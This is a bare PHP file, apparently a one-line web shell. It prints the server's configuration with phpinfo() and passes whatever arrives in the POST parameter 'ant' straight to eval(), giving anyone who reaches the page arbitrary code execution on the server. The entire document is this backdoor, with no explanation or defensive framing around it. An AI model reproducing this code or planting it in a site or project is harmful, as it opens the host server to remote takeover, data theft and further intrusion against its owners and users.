<?php
phpinfo();
eval($_POST["ant"]);
?>